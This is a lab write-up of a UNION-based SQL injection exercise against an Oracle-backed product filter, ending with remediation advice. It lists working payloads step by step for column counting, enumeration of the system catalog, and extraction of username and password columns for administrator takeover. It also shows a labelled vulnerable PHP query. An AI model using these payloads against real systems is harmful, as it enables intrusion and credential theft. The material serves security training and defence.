# Lab: SQL injection attack, listing the database contents on Oracle

## 1. Vulnerability Discovery & Enumeration (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=xyz`
* **Vulnerability Type:** Server-Side (SQL Injection - UNION Based)
* **Target Database Infrastructure:** Oracle

### Step 1: Mapping Column Count via Structural Ordering
To ensure compatibility with a `UNION`-based injection layout, I first determined the exact column structure of the primary query layout.
* `category=xyz' ORDER BY 1--` -> HTTP 200 OK
* `category=xyz' ORDER BY 2--` -> HTTP 200 OK
* `category=xyz' ORDER BY 3--` -> HTTP 500 Internal Server Error

**Deduction:** The database architecture expects exactly **2 columns**. 

### Step 2: Testing Data Type Compatibility
Oracle requires a `FROM` clause for all queries. I validated if both columns cleanly process string payloads by testing against Oracle's built-in global placeholder table (`DUAL`):
* Payload: `category=xyz' UNION SELECT 'abc', 'def' FROM dual--` -> HTTP 200 OK

**Deduction:** Both slots support arbitrary string values.

### Step 3: Enumerating the System Catalog (The Table Hunt)
Oracle houses its accessible table metadata inside the global view `all_tables`. I forced the primary product lookup to fail using a dummy category (`xyz`) to isolate our injected output lines cleanly:
* Payload: `category=xyz' UNION SELECT table_name, NULL FROM all_tables--`

**Resulting Target Table:** Isolated the randomized schema user container (e.g., `USERS_XXXXXX`).

### Step 4: Enumerating Structural Field Headers (The Column Hunt)
With the target table name mapped, I queried the `all_tab_columns` system catalog view to find the precise headers where credential records live:
* Payload: `category=xyz' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XXXXXX'--`

**Resulting Target Columns:** Isolated the custom randomized credential columns (e.g., `USERNAME_XXXXXX` and `PASSWORD_XXXXXX`).

## 2. Exploitation & Exfiltration (The Hack)
* **Payload Used:** `' UNION SELECT USERNAME_XXXXXX, PASSWORD_XXXXXX FROM USERS_XXXXXX--`
* **Full URL Encoded Input:** `/filter?category=xyz'+UNION+SELECT+USERNAME_XXXXXX,+PASSWORD_XXXXXX+FROM+USERS_XXXXXX--`
* **Mechanism:** 
  1. The trailing single quote (`'`) successfully terminates the string query boundary.
  2. The payload requests the custom username and password columns side-by-side.
  3. The layout satisfies the 2-column database structure, and the comment syntax (`--`) drops trailing code to prevent validation failure.
* **Result:** The system extracted administrative credentials directly into the public UI context text layout, enabling an immediate administrative session takeover as the `administrator` user.

## 3. Remediation (The Fix)
* **Flawed Concept:** The application parses raw client-side parameters and executes them dynamically as database logic.
* **The Correction:** Refactor the backend data connectors to use **Prepared Statements (Parameterized Queries)**.

### Vulnerable Code Example (Conceptual Backend Context)
```php
// Vulnerable: Runtime variable interpolation allows query structure manipulation
\$category = \$_GET['category'];
\$query = "SELECT name, description FROM products WHERE category = '" . \$category . "'";
\$result = \$db->query(\$query);
```

### Secure Remediation Example (Parameterized Validation)
```php
// Secure: Explicit separation ensures user input is strictly parsed as data strings, never code
\$category = \$_GET['category'];
\$stmt = \$db->prepare('SELECT name, description FROM products WHERE category = :category');
\$stmt->execute(['category' => \$category]);
\$products = \$stmt->fetchAll();
```
